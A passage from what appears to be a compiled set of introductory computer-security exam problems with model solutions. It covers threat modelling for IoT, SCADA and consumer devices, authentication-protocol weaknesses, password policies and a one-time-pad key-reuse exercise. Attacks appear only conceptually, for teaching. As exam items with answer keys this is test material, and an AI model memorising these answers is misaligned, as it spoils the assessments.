1.3 Weakness: Lack of Mutual Authentication. The protocol only authenticates the terminal to the meter. It does not authenticate the meter to the terminal. An attacker could install a fake meter to harvest the terminal's responses or trick the technician. Mitigation: Implement Mutual Authentication where both parties verify each other's identity, ideally using digital certificates (PKI) rather than a simple shared secret hash.

### Improved Step-by-Step Explanation:
For 1: The 'remote disconnect' feature is highly critical; mass exploitation directly impacts the national power grid, a prime target for nation-state attackers aiming for disruption. The granular power usage data acts as a proxy for physical presence, making it a valuable asset for criminals planning burglaries. Understanding these assets and their associated threats is key to prioritizing security measures.
For 1.2: The optical port represents a local, physical attack surface, compounded by its use of an unencrypted, proprietary protocol that lacks robust security testing. The LTE interface represents a remote attack surface; despite using TLS 1.2, vulnerabilities in the TLS stack or insecure device configuration (e.g., open ports) could be exploited from anywhere on the cellular network.
For 1.3: The proposed protocol is vulnerable to rogue devices. Because the terminal computes a response based on the meter's challenge without challenging the meter in return, the meter's identity is never verified. A malicious actor could spoof a meter, send challenges, and observe the terminal's valid responses. To fix this, the authentication must be mutual, ensuring that the terminal also challenges the meter and verifies its authenticity before proceeding.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Consider floor cleaning robots, automated devices designed to maintain and clean floors without human intervention. Utilizing a combination of sensors, algorithms, navigation systems, and video cameras, these robots can map out rooms and detect dirt, debris, and obstacles... 1. Suggest two relevant assets at risk in such a scenario. Motivate your answer. 2. Suggest the most likely potential threats and threat agents against such infrastructure and their operating companies.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Assets at Risk**
1. **Reputation**: The company's public image and trustworthiness are at risk. If a breach occurs, consumers will lose trust in the brand, severely impacting sales and market position.
2. **User Private Data**: The data collected by the robots (e.g., mapped floor plans, times when the user is typically 'away' from home, cleaning habits, and potentially live video feeds from inside the house) are highly sensitive personal information.

**Step 2: Identifying Potential Threats and Threat Agents**
1. **Threat**: Denial of Service (DoS). **Threat Agent**: Competitors. **Motivation**: A competitor might want to disrupt the service to frustrate users, degrade the brand's reliability, and ultimately steal market share.
2. **Threat**: Data Breach. **Threat Agent**: Cyberattackers/Hackers. **Motivation**: Attackers could target the company's cloud infrastructure to steal users' private data (like home layouts, away times, or video feeds) for blackmail, selling to third parties, or planning physical burglaries.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Consider a fingerprint door lock... Describe two different relevant assets and related threats at risk in this scenario... Discuss which would be the most likely attack and mitigation...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Assets, Threats, and Mitigations**
1. **Asset**: Physical Security of the Building (Protection of belongings and people inside).
   - **Threat**: Spoofing (Biometric Bypass). Attackers can create artificial "gummy" fingers using silicone, gelatine, or 3D-printed materials lifted from latent prints left on the scanner or nearby surfaces.
   - **Mitigation**: Implement Multifactor Authentication (e.g., requiring both a fingerprint and an RFID card) or utilize more sophisticated biometric scanners that include liveness detection (checking pulse, blood flow, or heat).
2. **Asset**: Scanned Fingerprint Data (User Biometric Information).
   - **Threat**: Data Breach. If the local storage is physically accessed or hacked over a network, attackers could steal raw fingerprint templates, which cannot be changed like passwords.
   - **Mitigation**: Fingerprint templates must be stored cryptographically hashed or securely encrypted within a dedicated tamper-proof hardware module (Secure Enclave), ensuring the raw image is never accessible.

**Step 2: Analyzing Numpad Additions**
- **Scenario**: Adding a numpad with an anti-peeping cover.
- **Most Likely Attack**: Given the anti-peeping cover prevents "snooping" (shoulder surfing), the most viable attack becomes **Guessing/Brute-forcing**. Attackers could observe wear patterns on the keys or methodically try common PINs.
- **Mitigation**: Enforce PIN complexity rules (disallow 1234, 0000), require periodic PIN changes, and implement a lockout mechanism (e.g., locking the pad for 5 minutes after 3 failed attempts) to neutralize brute-force attacks.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Consider object tracking devices such as the one developed by Apple or Tile... What are the main assets at risk... Suggest the most likely potential threats... Suggest potential security solutions...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Assets at Risk**
1. **Personal Information and Location Data**: The most critical asset. Tracking devices continuously broadcast and log geographical coordinates. If compromised, an attacker gains a detailed history of a user's movements, home location, and routines.
2. **Physical Assets**: The actual items the trackers are attached to (keys, wallets, cars). A breach could allow thieves to locate high-value items specifically to steal them.
3. **Network Infrastructure**: The crowdsourced tracking network relies on billions of smartphones. If the infrastructure is compromised, it could be used for massive surveillance or DDoS amplification.
4. **Business Reputation**: Trust is paramount. A privacy scandal would instantly destroy consumer confidence and lead to massive financial and legal repercussions for the company.

**Step 2: Analyzing Threats and Threat Agents**
1. **Threat**: Stalking/Privacy Violations. **Threat Agent**: Malicious individuals. **Motivation**: Bad actors slip tracking devices into a victim's belongings to stalk them, learning their addresses and routines without their consent.
2. **Threat**: Data Breach. **Threat Agent**: Cybercriminals/Hackers. **Motivation**: Hackers target the centralized cloud databases to steal bulk user location data for extortion, sale on the dark web, or strategic targeting.

**Step 3: Proposing Security Solutions**
1. **End-to-End Encryption**: Encrypt location data not just in transit, but such that only the owner's paired device possesses the decryption key. The central servers should route the data but be mathematically unable to read the locations.
2. **Anti-Stalking Alerts**: Implement algorithms on smartphones that detect if an unknown tracker is moving with a person over a period of time, triggering a push notification and a sound on the tracker to alert the potential victim.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
The GPT-3 model, developed by OpenAI... company A.C.M.E. has instructed the model with a specific set of instructions... What are the main assets at risk... Suggest the most likely potential threats...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Assets at Risk in AI Systems**
1. **Custom Model/Training Data/Prompts**: The specific instructions and fine-tuning data A.C.M.E. used to customize the bot are proprietary intellectual property. If stolen, competitors could replicate the chatbot's specific behavior.
2. **Company Reputation**: If the AI begins outputting offensive, racist, or highly inappropriate content, it directly harms the brand's public image.
3. **Financial Resources**: A.C.M.E. pays a fixed fee per API call. An attack targeting the endpoint drains company funds.

**Step 2: Identifying Potential Threats and Threat Agents**
1. **Threat**: Data Poisoning / Model Corruption. **Threat Agent**: Internet Trolls/Malicious Users. **Motivation**: Because the system learns from user feedback, coordinated trolls can intentionally feed the bot toxic or biased responses. The model ingests this bad data, altering its neural weights, and eventually begins organically spewing toxic interactions to legitimate users.
2. **Threat**: Economic Denial of Service (EDoS). **Threat Agent**: Cyberattackers/Competitors. **Motivation**: Attackers use automated scripts to spam the chatbot with millions of rapid queries. Since A.C.M.E. pays per API request, this attack aims to inflict massive financial damage and force the company to shut down the service.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security (4 points)}
\subsubsection*{Problem}
\begin{verbatim}
Consider a dam equipped with a Supervisory Control And Data Acquisition (SCADA) system, an industrial control system used to monitor and control the dam's operations. The SCADA system collects data from various sensors (e.g., water level, flow rate, temperature) and sends it to a central control room, where operators can monitor the dam's status and make adjustments as needed. The system also controls the opening and closing of gates and valves, as well as the operation of pumps and turbines. The SCADA system is connected to the Internet for remote monitoring and control, and it uses a combination of wired and wireless communication protocols.
[1.5 points] 1. Identify and describe two relevant assets at risk in such a scenario, along with their associated threats and threat agents. All elements must be motivated.
[1 point] 2. Suggest at least two potential attack surfaces for the infrastructure under analysis.
[1.5 points] 3. A friend of yours suggests using a custom challenge and response protocol to authenticate devices for “remote monitoring and control” that works as follows: devices involved in the communication have to share the SHA3 of a preshared secret, securely stored in each device. If the hashes match on both endpoints, the authentication is successful. Highlight the weaknesses of the proposed protocol and suggest a modification to make it working.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Assets, Threats, and Threat Agents.**
An asset is anything of value that needs protection. In a dam's SCADA system, the most obvious asset is the **Dam Infrastructure** itself, both physical (gates, valves, turbines) and cyber (control systems, servers). A threat is a potential cause of an unwanted incident. For the infrastructure, a major threat is **unauthorized remote access or manipulation**, which could cause devastating effects like flooding. The threat agent, or the entity causing the threat, could be **malicious hackers or state-sponsored actors** motivated by sabotage. Another critical asset is the **Environmental Impact/Safety**. The threat here is the release of large amounts of water causing environmental damage, and the threat agent could be **eco-terrorists or disgruntled individuals**.

**Step 2: Identifying Attack Surfaces.**
An attack surface is the sum of all points where an unauthorized user can try to enter data to or extract data from an environment.
- **The SCADA system itself:** Software vulnerabilities in the SCADA software.
- **Communication networks:** Interception of wireless or wired data transmission (e.g., lack of encryption).
- **Physical access:** If an attacker can walk up to a sensor or control panel and tamper with it.
- **Remote access points:** Maintenance ports or remote desktop interfaces for administrators.
- **Human operators:** Social engineering attacks like phishing against the operators.

**Step 3: Analyzing the Authentication Protocol.**
The proposed protocol just sends `SHA3(secret)` over the network.
- **Lack of Freshness (Replay Attack):** The hash is static. An attacker can sniff `SHA3(secret)` and simply replay it later to authenticate, without knowing the secret itself.
- **Man-in-the-Middle (MitM):** No session key is established, so an attacker could intercept subsequent commands.
- **No Mutual Authentication:** The device doesn't know if it's talking to the real control room or an imposter server.
- **Preshared Secret Management:** Storing the same secret everywhere is risky; if one device is compromised, all are at risk if the same secret is used.

**How to fix it:**
To prevent replay attacks, we need *freshness*. We can introduce a **Nonce** (number used once). The control server sends a random nonce $N$, and the device replies with `HMAC(secret, N)`. This guarantees the response is fresh for this specific session. To ensure the device also trusts the server, we need **Mutual Authentication**: the device also sends a nonce $M$ to the server, and the server replies with `HMAC(secret, M)`. Finally, instead of plain hashing, using a standard construct like **HMAC** prevents length-extension attacks and properly mixes the key and the message.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Consider a flight infotainment system that allows passengers to access various entertainment options, such as movies, music, and games, during their flight. Additionally, the system provides internet connectivity via Wi-Fi and allows passengers to register their credit card information for in-flight purchases.

[2 points] 1. Identify and describe two relevant assets at risk in such a scenario, along with their associated threats and threat agents.
[1 point] 2. Suggest, in rough order of importance, the most likely potential threats and threat agents against such infrastructure and their operating companies.
[1 point] 3. The company proposes an authentication mechanism based on biometrics for accessing the payment system. Is this a good idea? Discuss the advantages and disadvantages of this approach in this specific context.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Assets, Threats, and Threat Agents**
*Understanding the Concepts:*
- **Asset**: Anything of value that needs protection (e.g., data, hardware, reputation).
- **Threat**: A potential cause of an incident that may result in harm to a system or organization.
- **Threat Agent (or Actor)**: The entity that carries out a threat.

*Applying to the Scenario:*
1. **Asset: Payment Gateway / Credit Card Information**
   - **Threat**: Unauthorized access, interception, or exfiltration of sensitive financial data.
   - **Threat Agent**: Malicious hackers, cybercriminals, or financially motivated attackers exploiting vulnerabilities in the infotainment system or Wi-Fi network.
2. **Asset: Quality of Service (QoS) and Availability (Infotainment System)**
   - **Threat**: Denial of Service (DoS) attacks disrupting the availability of movies, music, or internet connectivity, leading to passenger dissatisfaction.
   - **Threat Agent**: Disgruntled passengers, script kiddies, or individuals seeking to cause disruption or nuisance.

**Question 2: Most Likely Potential Threats and Threat Agents**
When prioritizing threats, we consider the likelihood and impact. For an in-flight system, physical access and local network access are highly relevant.
1. **Physical Access Tampering**: The most direct threat. Passengers have prolonged physical access to the hardware components (screens, cables, USB ports). *Threat Agent*: Malicious passengers attempting to tamper with the device directly.
2. **Unauthorized Access via External Interfaces**: Exploiting exposed USB ports, maintenance ports, or hidden diagnostic interfaces. *Threat Agent*: Tech-savvy passengers or hardware hackers.
3. **Wi-Fi Infrastructure Vulnerabilities**: Exploiting weak encryption, rogue access points, or network misconfigurations to intercept traffic. *Threat Agent*: Attackers on board the same flight.

**Question 3: Biometric Authentication for In-Flight Payments**
*Analyzing the Proposal:*
Biometrics (e.g., fingerprint, facial recognition) rely on physical characteristics. Using them in a shared, public environment like an airplane seat has unique implications.

*Advantages:*
- **Security**: Biometrics are inherently tied to the individual, making them difficult to forge, guess, or steal remotely compared to passwords.
- **Convenience**: Passengers do not need to remember complex passwords, improving the user experience.

*Disadvantages:*
- **Privacy and Data Protection**: Biometric data is sensitive. If compromised, the theft is catastrophic because a fingerprint cannot be changed.
- **Implementation Costs and Maintenance**: Equipping every seat with high-quality, reliable biometric sensors is expensive.
- **Spoofing Vulnerabilities**: Without sophisticated liveness detection, biometric systems can sometimes be bypassed using fake fingerprints or high-resolution photos.

*Conclusion:* While convenient, storing or processing biometric data on vulnerable seatback screens introduces severe privacy risks. Robust security measures must be implemented to protect the data and prevent spoofing.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
The widespread use of drone technology has revolutionized various industries, including aerial photography, delivery services, and infrastructure inspections. However, the increasing accessibility and capabilities of drones also raise concerns about their potential misuse for malicious purposes. Consider a scenario where a company utilizes drones for aerial surveillance and package delivery:
- The company operates a fleet of drones equipped with high-resolution cameras and GPS navigation systems.
- The drones transmit real-time video feeds and telemetry data over a 5G network back to the central control station. The communication protocol uses an MD5 checksum for data integrity.
- The collected surveillance footage and delivery data are stored on the company's servers, with access protected by MD5 salted and hashed passwords. The server operating system is Windows 2000 Server.
- The company website, where customers can track their deliveries, is served over HTTP.

Answer the following questions, considering the security implications of drone usage in this specific scenario only:
[1.5 points] 1. Identify and describe the 2 most relevant assets at risk in such a scenario, along with their associated threats and threat agents. All elements must be motivated.
[1.5 points] 2. Identify 2 potential vulnerabilities in the company's drone operations, specifying how it can be exploited by threat agents and a possible countermeasure.
[1 point] 3. As a password recovery scheme, the company decides to implement the following mechanism: when a user asks to reset their password, an email is sent to the user with a new randomly generated password. This password is created by combining a randomly selected word (up to 9 lower case characters) from a dictionary of animal names with a randomly generated 3-digit number (e.g., "dolphin451"). Analyze the security of this password recovery scheme. Identify its potential weaknesses and suggest improvements to enhance its security.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Identifying Assets, Threats, and Threat Agents
**Step-by-Step Reasoning:**
When identifying assets, we look for data, hardware, or systems critical to the operation or containing sensitive information.
- **Asset 1: Surveillance Footage and Delivery Data**
  - *Motivation:* This data is highly sensitive, revealing customer routines, private premises, and company operations.
  - *Threat:* Unauthorized access, data breaches, and data exfiltration (violating Confidentiality).
  - *Threat Agent:* Hackers motivated by financial gain (selling data), competitors, or malicious actors aiming for blackmail.
- **Asset 2: Drones (Physical and Operational Assets)**
  - *Motivation:* Drones are expensive physical hardware and are the core operational mechanism for the company.
  - *Threat:* Hijacking, interception, physical theft, or signal jamming (violating Availability and Integrity).
  - *Threat Agent:* Criminals aiming to steal the hardware, competitors seeking to disrupt operations, or malicious actors wanting to repurpose the drones.

### 2. Vulnerabilities, Exploits, and Countermeasures
**Step-by-Step Reasoning:**
We analyze the scenario description for outdated technologies or insecure practices.
- **Vulnerability 1: Outdated Server Operating System (Windows 2000 Server)**
  - *Exploitation:* Windows 2000 has been unsupported for decades. It lacks modern security patches. Attackers can exploit well-known, unpatched CVEs (e.g., buffer overflows, RPC vulnerabilities) to achieve Remote Code Execution (RCE) and take full control of the servers.
  - *Countermeasure:* Upgrade to a modern, actively supported Operating System (e.g., Windows Server 2022 or a supported Linux distribution) and implement a regular patch management policy.
- **Vulnerability 2: Use of HTTP for the Company Website / MD5 for Hashing**
  - *Exploitation (HTTP):* HTTP traffic is unencrypted plaintext. Attackers can perform Man-in-the-Middle (MitM) attacks on the network to eavesdrop on customer data or hijack sessions.
  - *Exploitation (MD5):* MD5 is cryptographically broken and vulnerable to collision attacks. It can be easily cracked using rainbow tables or brute-force using modern GPUs.
  - *Countermeasure:* Enforce HTTPS (TLS 1.2/1.3) to encrypt data in transit. Replace MD5 with a strong, slow hashing algorithm like Argon2, bcrypt, or at least SHA-256 with proper salting.

### 3. Password Recovery Scheme Analysis
**Step-by-Step Reasoning:**
To evaluate the password strength, we calculate the entropy (the number of possible combinations).
- **Dictionary size:** Animal names (assumed to be a relatively small dictionary, e.g., a few thousand words). Let's say 1,000 words.
- **Numbers:** 3 digits = 1,000 combinations (000-999).
- **Total combinations:** 1,000 words * 1,000 numbers = 1,000,000 possible passwords.
- **Vulnerability:** 1 million combinations can be cracked in less than a second by a modern GPU. The structure is predictable (word + number), there are no special characters, and lowercase only limits the character space.
- **Delivery Risk:** Sending plaintext passwords via email is highly insecure. Emails traverse networks unencrypted (if TLS is misconfigured) and reside in the user's inbox in plaintext, easily compromised.
- **Improvements:** 
  1. Do not generate and send plaintext passwords. Instead, generate a secure, single-use, time-limited reset link containing a cryptographically secure token.
  2. Implement Multi-Factor Authentication (MFA).
  3. Require users to choose their own strong password upon clicking the link, enforcing length (e.g., minimum 12-16 characters) and complexity policies, rather than relying on a weak dictionary generation.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Modern cities increasingly rely on intelligent traffic management systems to optimize traffic flow... Identify 2 assets at risk, 3 potential vulnerabilities, and analyze the password recovery scheme.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Assets at Risk:
- Central Traffic Control System: The core system managing infrastructure. Threats include Unauthorized Configuration Manipulation via unencrypted FTP, and DoS attacks disrupting city management. Threat agents can be hackers or terrorists.
- IoT Sensor Network: Collects real-time data. Threats include Data Interception and Manipulation due to weak WEP encryption, and Device Hijacking. Threat agents are cybercriminals or insiders.

2. Vulnerabilities:
- Insecure Communication (FTP/WEP): FTP is unencrypted; WEP is easily cracked. Fix: Use SFTP/HTTPS and WPA3.
- Legacy SQL Database: Susceptible to SQL injection. Fix: Implement parameterized queries and update the DBMS.
- Outdated TLS (1.2): May support weak cipher suites leading to session hijacking. Fix: Upgrade to TLS 1.3.

3. Password Recovery Weaknesses:
- Exposes passwords via Email: Emails are often transmitted in plaintext.
- Insecure Storage: If the system can recover the plaintext password, it is not properly hashed (e.g., using bcrypt).
- Encourages Poor Practices: Reused passwords will be exposed. Fix: Send a time-limited reset link and enforce secure password hashing.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a ride-sharing application. Identify two primary assets at risk, two distinct attack surfaces, and two potential vulnerabilities that could be exploited.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Assets at Risk:
- User Personal & Location Data: Highly sensitive asset. Threats include unauthorized access and exfiltration leading to identity theft or stalking. Threat agents are cybercriminals or malicious insiders.
- Service Availability & Integrity: Crucial for business operations. Threats include DDoS attacks on backend servers, preventing ride booking. Threat agents are hacktivists or unethical competitors.

2. Attack Surfaces:
- The Mobile Application: Runs on untrusted client devices. Vulnerabilities here include insecure data storage, reverse engineering, and excessive permissions.
- The Cloud Backend API: The interface exposed to the internet for app communication. Vulnerabilities include Broken Object Level Authorization (BOLA), injection flaws, and weak authentication.

3. Vulnerabilities:
- Legacy Support (Java 8, TLS 1.0/1.1, SHA-1): Supporting outdated protocols enables downgrade attacks. Attackers can force the connection to use TLS 1.0, which has known cryptographic weaknesses, allowing Man-in-the-Middle (MitM) interception.
- Excessive Mobile App Permissions: Requesting camera and microphone for core ride-sharing functions violates the principle of least privilege. If the app is compromised (e.g., via a malicious dependency), attackers could surreptitiously record users.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze an airport Baggage Handling System (BHS) architecture. Identify relevant assets at risk, attack surfaces, and evaluate the security of SCADA systems using self-signed certificates.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Assets at Risk:
- Baggage Routing Logic / Control System (PLCs & SCADA): The core operational component. 
  - Threat: Sabotage via unauthorized commands, leading to misrouted baggage, operational paralysis, and reputational damage.
  - Threat Agent: Ransomware gangs (extortion) or malicious insiders.
- Passenger and Flight Assignment Data (Airline Databases): Contains PII and routing info.
  - Threat: Data exfiltration or manipulation. Modifying records could route dangerous items onto specific flights.
  - Threat Agent: Nation-state actors (espionage) or hacktivists.

2. Attack Surfaces:
- Internal Network & Remote Access Interfaces: The temporary Wi-Fi and remote maintenance VPNs. If poorly secured, they provide a bridgehead into the SCADA network.
- PLCs and SCADA System Interfaces: Legacy industrial protocols (like Modbus or S7) often lack native authentication. Once an attacker is on the network, these devices are easily compromised.

3. SCADA Authentication Weaknesses & Improvements:
- Weakness 1: No Trust Anchor. Self-signed certificates have no chain of trust. An attacker on the network can easily generate a spoofed certificate with the target device ID, and the controller will accept it.
- Weakness 2: Revocation inability. Locally stored, permanently accepted certificates cannot be easily revoked if a PLC is stolen or compromised.
- Improvement: Implement a proper Public Key Infrastructure (PKI) with a central Certificate Authority (CA). Devices must present certificates signed by the CA. Alternatively, use TPM-based device attestation for hardware-backed identity verification.
\end{verbatim}

\subsection{Exercise 1 - Introduction to Computer Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a smart agricultural greenhouse control system. Identify assets at risk, vulnerabilities involving lack of authentication and cleartext communication, and propose countermeasures.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Assets at Risk:
- Crop Health and Productivity: The physical output of the business. 
  - Threat: Sabotage of environmental controls (e.g., turning off water or heating) causing crop failure.
  - Threat Agent: Unethical competitors or malicious hackers.
- Company Reputation / Financial Stability: 
  - Threat: Data breaches or massive crop loss leading to bankruptcy or loss of customer trust.
  - Threat Agent: Disgruntled insiders or cybercriminals.

2. Vulnerabilities and Countermeasures:
- Lack of Authentication on Sensor Messages: Sensors communicate wirelessly over plain HTTP without verifying the source. 
  - Exploit: A nearby attacker can inject spoofed HTTP requests containing fake sensor data (e.g., reporting high soil moisture), causing the controller to under-irrigate the crops.
  - Countermeasure: Implement message authentication using HMACs with a shared secret key, ensuring data integrity and origin authenticity.
- Unsecured USB Maintenance Port: Physical access bypasses network security.
  - Exploit: An attacker (or insider) with physical access can plug in a USB drive to inject malicious firmware or extract configuration files.
  - Countermeasure: Disable USB ports by default and require strong physical authentication (e.g., smart card access) to enable them.
- Cleartext Wireless Communication: Proprietary protocols over HTTP lack encryption.
  - Exploit: Attackers can eavesdrop on actuator commands via RF sniffing and replay them later to manipulate the greenhouse environment.
  - Countermeasure: Enforce encryption for all wireless traffic using lightweight protocols suitable for IoT, such as AES-CCM or TLS/DTLS.
\end{verbatim}


\section{Introduction to Computer Security & Access Control}
Exercises for Introduction to Computer Security & Access Control

\subsection{Exercise 1 - Introduction to Computer Security \& Access Control}
\subsubsection*{Problem}
\begin{verbatim}
In a company, each employee works in an open space. We need to design proper policies to minimize the risk that passwords get compromised. Such policies will be enforced whenever a user chooses a new password. Also, assume that passwords are only used to access a cloud-based email client over TLS.
[1 point] 01. What are the main characteristics of a password on which we can act when writing a policy?
[2 points] 02. What is the most likely attack scenario against passwords considering the above description of the conditions of each employee? Why?
[1 point] 03. Given the answer provided in point B., what is the most important characteristic that you need to enforce in the password policy (in order to avoid the attack scenario)?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**01.** The main characteristics of a password that can be enforced through a policy are:
- Length (minimum and maximum number of characters).
- Complexity (requiring a mix of uppercase, lowercase, numbers, and special characters).
- Expiration/Lifetime (how often the password must be changed).
- History/Reuse restrictions (preventing users from reusing recent passwords).
- Dictionary checks (prohibiting common words or easily guessable patterns).

**02.** The most likely attack scenario is "Shoulder Surfing" (or observational attacks). The description specifies that "each employee works in an open space," meaning their screens and keyboards are easily visible to colleagues passing by. Furthermore, the passwords are only used for a "cloud-based email client over TLS," which protects them from network-based attacks like sniffing (since TLS encrypts the traffic). Thus, physical observation while typing is the most significant threat.

**03.** Given the threat of shoulder surfing, the most important characteristic to enforce in the password policy is **length** (e.g., favoring passphrases). A longer password is much harder to memorize by simply glancing at someone typing, whereas short but complex passwords can sometimes be caught by watching the keyboard strokes. Additionally, avoiding forced frequent expiration helps prevent users from writing their passwords down on easily visible sticky notes.
\end{verbatim}


\section{Introduction to Computer Security & Auth}
Exercises for Introduction to Computer Security & Auth

\subsection{Exercise 1 - Introduction to Computer Security \& Auth}
\subsubsection*{Problem}
\begin{verbatim}
A university department uses WeBibBip, a web application for a programming course...
1.1 [3 points] Some lines of the table are correct, while others contain a wrong value...
1.2 [1 point] In order to reduce the overall risk...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1.1 C2 (L): Low: teaching assistants use multi-factor authentication, so stolen passwords alone are less likely to allow unauthorized access. C3 (L): High: there is no rate limiting, and the platform is heavily used near deadlines. C5 (L): Low: the application is available only through HTTPS, reducing the likelihood of data sniffing. C6 (A): Remove the line: final grades are not handled by WeBibBip. C7 (A): Remove the line: public course resources are intentionally available without login, so data leakage is not a relevant threat. C8 (A): Remove the line: physical disks and low-level cloud infrastructure are managed by the external cloud provider, not by the department.
1.2 M2 is the best choice because it reduces the overall risk on more valid risk lines than the other proposed countermeasures. It reduces C1, because rate limiting makes credential guessing and brute-force attacks against student accounts less likely. It also reduces C3, because rate limiting reduces the likelihood of service disruption caused by flooded requests. M1 also reduces C1, but it only affects one line. M3 is related to uploaded files, but it does not directly reduce any of the valid risk lines identified in Question 1.1, because the table does not include a file-integrity/tampering risk. Therefore, under the limited budget, M2 gives the largest reduction of the overall risk.

### Improved Step-by-Step Explanation:
For 1.1, understanding risk components is crucial. C2 Likelihood is low because even with a stolen password, the attacker lacks the second factor for MFA. C3 Likelihood is high as the lack of rate limiting makes a flood of requests easily lead to disruption. C5 Likelihood is low because HTTPS encrypts the traffic, mitigating data sniffing. C6 Asset is invalid since grades are managed in a separate system. C7 Asset is public by design, so leakage isn't a threat. C8 Asset is managed externally, making physical damage an accepted or transferred risk out of the department's direct scope.
For 1.2, we must look at the overall impact across all valid risks. M1 only mitigates C1. M3 doesn't mitigate any listed valid risk. M2 mitigates both C1 (by slowing down brute-force attacks) and C3 (by limiting the flood of requests). Therefore, M2 offers the highest risk reduction for the given budget.
\end{verbatim}


\section{Introduction to Cryptography and TLS}
Exercises for Introduction to Cryptography and TLS

\subsection{Exercise 2 - Introduction to Cryptography and TLS}
\subsubsection*{Problem}
\begin{verbatim}
You have intercepted two ciphertexts:
c1 = 1111100101111001110011000001011110000110
c2 = 1111101001100111110111010000100110001000

You know that both are OTP ciphertexts, encrypted with the same key.

1. [2 points] You know that either c1 is an encryption of alpha and c2 is encryption of bravo or c1 is an encryption of delta and c2 is an encryption of gamma (all converted to binary from ascii in the standard way). Which of these two possibilities is correct, and why?
2. [1 point] What was the key k? Explain a procedure to obtain the key
3. [2 points] Suppose now that the encryption algorithm is modified as follows:
EAVESDROP'(m \in {0, 1}^\lambda):
k <- {0, 1}^\lambda
c := k XOR m
return (k, c)
Please, explain the weakness of the proposed approach.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**1.** Since c1 and c2 are encrypted with the same One-Time Pad (OTP) key, XORing the two ciphertexts together will cancel out the key: `c1 XOR c2 = (m1 XOR k) XOR (m2 XOR k) = m1 XOR m2`.
First, compute `c1 XOR c2`:
c1 = 11111001 01111001 11001100 00010111 10000110
c2 = 11111010 01100111 11011101 00001001 10001000
c1 XOR c2 = 00000011 00011110 00010001 00011110 00001110

Next, compute the XOR of the ASCII binary values for the first possibility ("alpha" and "bravo"):
'a' XOR 'b' = 01100001 XOR 01100010 = 00000011
'l' XOR 'r' = 01101100 XOR 01110010 = 00011110
'p' XOR 'a' = 01110000 XOR 01100001 = 00010001
'h' XOR 'v' = 01101000 XOR 01110110 = 00011110
'a' XOR 'o' = 01100001 XOR 01101111 = 00001110
This exactly matches `c1 XOR c2`. Therefore, the correct possibility is that c1 is the encryption of "alpha" and c2 is the encryption of "bravo".

**2.** To obtain the key `k`, we simply XOR the ciphertext with its corresponding known plaintext. Due to the properties of XOR, `c1 = m1 XOR k` implies `k = c1 XOR m1`.
Using c1 and m1 ("alpha"):
c1 = 11111001 01111001 11001100 00010111 10000110
'a','l','p','h','a' = 01100001 01101100 01110000 01101000 01100001
k  = 10011000 00010101 10111100 01111111 11100111
This provides the secret key.

**3.** The proposed encryption algorithm EAVESDROP' generates a random key `k`, computes the ciphertext `c = k XOR m`, but critically, it returns the pair `(k, c)`. The weakness is fundamental: by returning the key alongside the ciphertext, anyone who intercepts the message immediately possesses the key required to decrypt it. The attacker simply needs to compute `m = c XOR k`. This approach completely defeats the purpose of encryption, offering zero confidentiality.
\end{verbatim}


\section{Introduction to Computer Security & Authentication}
Exercises for Introduction to Computer Security & Authentication

\subsection{Exercise 1 - Introduction to Computer Security \& Authentication}
\subsubsection*{Problem}
\begin{verbatim}
Consider ad-blocking browser extensions designed to enhance web browsing by eliminating unwanted ads. These client-side programs use a combination of algorithms, filters, and user-defined settings to identify and block various forms of advertisements. They operate by analyzing the content of web pages and distinguishing ads from the main content, thus preventing them from displaying. Users can customize these extensions to allow non-intrusive ads or to block all ads indiscriminately. These extensions require minimal setup and are usually connected to regularly updated online public databases, where they retrieve the latest filters and rules. Many advanced versions offer additional features through integration with browser functionalities, allowing users to manage their preferences, view statistics on blocked content, or even report unblocked ads.

[2 points] 1. Suggest two relevant assets at risk in such a scenario. Motivate your answer.

[2 points] 2. Suggest the most likely potential threats and threat agents against such infrastructure and their operating companies.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Relevant Assets at Risk

1. **User Privacy and Data Security:**
   - *Motivation:* Ad-blocking extensions often require access to all data on websites visited by users to effectively block ads. This level of access can put user privacy at risk if the extension is not from a trustworthy source. Malicious or poorly designed extensions could potentially track user browsing habits, collect sensitive data such as passwords, or even modify website content in harmful ways.
